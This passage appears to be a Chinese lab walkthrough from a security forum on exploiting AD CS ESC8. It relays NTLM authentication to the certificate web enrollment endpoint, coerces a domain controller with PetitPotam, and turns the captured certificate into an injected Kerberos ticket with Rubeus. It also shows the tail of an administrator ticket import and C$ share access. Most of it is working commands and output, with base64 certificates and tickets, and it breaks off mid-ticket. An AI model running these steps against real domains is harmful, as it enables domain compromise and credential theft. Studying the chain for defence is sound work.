      Erp18B8GGc/16kR1PrO76YYnBlWba92QbqNVuWKbXAga5/+hL6VG/l6I7+Uo3hMvOVGmcduKEuEzkHNG
      bSgWbSXZNzOOzzssM9CYO7iuwlp0n3GA2DLaA7X0G+YnNQZYIUOozpm+VXidD5r3biI12M4MCBDoZoep
      +BuinPem4xtmH/nDlKcC3kTKVYX+Qoc0B1EM7MOga/71pTg1nD9yv45B5LyJTyJjMftypDnA3VwF3eWA
      VsZh50Xo4OUcTL47N/mKo3EvVlRcZW3qRxLE1it7pCEeOsNCk6zOIZzEoImKbTvhDkGmI/2rntUT9iya
      SPsBa86TTafCHfC2t5JN9aKBLEsOF+T/V+8NE2v5PQ6jmNEvc/7/Elqjjms5udbZ2W/i+KQ26Mn/GVUj
      3vN3r1/4+0ArlszhYMj3kKZr58Gfs5cHb84i5AUTqFTpp0rOGvDSombH+6OBzDCByaADAgEAooHBBIG+
      fYG7MIG4oIG1MIGyMIGvoBswGaADAgEXoRIEEINlaliMpcqUrXbMxnxAdlWhCRsHU1VOLkNPTaIaMBig
      AwIBAaERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEDhAAClERgPMjAyMjA1MDcyMDA1MDdaphEYDzIwMjIw
      NTA4MDYwNTA3WqcRGA8yMDIyMDUxNDIwMDUwN1qoCRsHU1VOLkNPTakcMBqgAwIBAqETMBEbBmtyYnRn
      dBsHc3VuLmNvbQ==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/sun.com
  ServiceRealm             :  SUN.COM
  UserName                 :  administrator
  UserRealm                :  SUN.COM
  StartTime                :  2022/5/8 4:05:07
  EndTime                  :  2022/5/8 14:05:07
  RenewTill                :  2022/5/15 4:05:07
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  g2VqWIylypStdszGfEB2VQ==
  ASREP (key)              :  DD24BE4AD10283239ED5704FA692D63B

C:\Users\user1\Desktop\test>
```

![image-20220508040705541](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-53623f38d96237e838c46fcc983d4fd52662417a.png)

![image-20220508040724018](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3b69c4e58a9f558915c33eef62a785f3d0a71ccc.png)

```php
dir \\matrix.sun.com\c$
```

![image-20220508040646097](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d5e2611de37e3001b5e9dd810e0f9986071d383e.png)

ADCS漏洞--ESC8(PetitPotam)(ADCS relay)
====================================

前言
--

ESC8是一个http的ntlm relay，原因在于ADCS的认证中支持NTLM认证

环境配置
----

打开控制面板--&gt;管理工具--&gt;Internet Information Services (IIS)管理器

![image-20220507174927485](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c9160dc12cc7f67cb3e6ff0f65b8cbb3c062c4db.png)

打开身份验证功能

![image-20220507181634486](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1590fd2de5ee197e04513cefc25481069ce0377c.png)

针对Windows 身份验证，默认是已启用

![image-20220507181653049](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-5c7a3dfe808f58f503cce3f637609c45d852ee2e.png)

右键提供程序，进行查看

可以看到是支持NTLM认证的

![image-20220507181741721](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-21d325a4d9a7a49568985a1d6764a9355e8ba08f.png)

使用PSPKIAudit工具包，查看Powershell执行策略

```php
Get-ExecutionPolicy
```

![image-20220506210550194](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-786567f4ced80b2be5cf1b1d672d00de13d5c9a0.png)

四种策略

```php
Restricted   禁止运行任何脚本和配置文件(默认)
AllSigned    可以运行脚本,但要求所有脚本和配置文件由可信发布者签名，包括在本地计算机上编写的脚本
RemoteSigned 可运行脚本,但要求从网络上下载的脚本和配置文件由可信发布者签名,不要求对已经运行和本地计算机编写的脚本进行数字签名
Unrestricted 可以运行未签名的脚本
```

设置策略

```php
Set-ExecutionPolicy Unrestricted
```

![image-20220506210647160](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0d0896be995de9bb7cea1320c99af38d2cda6983.png)

导入模块：

```php
Get-ChildItem -Recurse | Unblock-File

Import-Module .\PSPKIAudit.psm1
```

分析 CA 服务器和已授权发布的模板以寻找潜在的提升机会

可以看到默认是存在ESC8

```php
Invoke-PKIAudit
```

![image-20220507182734063](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ee38c4b4e57a958012bb2c67af2d4d7c6844b343.png)

定位证书

```php
certutil -config - -ping
```

![image-20220507205004383](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-5bafa91ce88542e0cc889f1d1ae9de1acc3ae587.png)

![image-20220507205025344](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-00bbabd1a71031b5849276986c39af0ab02addb2.png)

尝试访问是可以的

```php
http://192.168.40.101/certsrv/certfnsh.asp
```

![image-20220507205203095](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-abb5577fa910bc951d5f8b8d0252fc50894b931b.png)

实操
--

在kali中

ntlmrelayx.py将证书颁发机构 (CA) 设置为中继目标，开启监听

```php
python3 ntlmrelayx.py  -t http://adcs/certsrv/certfnsh.asp -smb2support --adcs --template 'Domain Controller'

python3 ntlmrelayx.py  -t http://192.168.40.101/certsrv/certfnsh.asp -smb2support --adcs --template 'Domain Controller'
```

![image-20220507205351893](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-585a72eae88d7044cb702ed64267e5088b156350.png)

使用打印机漏洞，触发PetitPotam，使用工具：<https://github.com/topotam/PetitPotam>

```php
python3 PetitPotam.py -u '' -d '' -p '' kali_ip 辅域_ip

python3 PetitPotam.py -u '' -d '' -p '' 192.168.40.129 192.168.40.102
```

![image-20220507221741113](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1cee83c6964065d4ff0cda9a21e9bb1e1f56d48f.png)

成功收到回连

![image-20220507221804024](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e5dd3d6ca361957939b725ea9833075875976fcd.png)

它是base64的，并且user是`STEVEN$`

```php
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
```

![image-20220507221831096](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1054492f2c87408ca4ac8b9f761accdefe3f4503.png)

在父域用户机器上

然后使用`Rubeus.exe`进行，证书请求`STEVEN$`的票据，并注入票据

```php
C:\Users\Administrator\Desktop\shell-master>Rubeus.exe asktgt /user:STEVEN$ /certificate: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 /domain:sun.com /dc:steven.sun.com /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=steven.sun.com
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sun.com\STEVEN$'
[*] Using domain controller: 192.168.40.102:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFajCCBWagAwIBBaEDAgEWooIEjzCCBIthggSHMIIEg6ADAgEFoQkbB1NVTi5DT02iHDAaoAMCAQKh
      EzARGwZrcmJ0Z3QbB3N1bi5jb22jggRRMIIETaADAgESoQMCAQKiggQ/BIIEO3iEMxzTDrqrauIp85/v
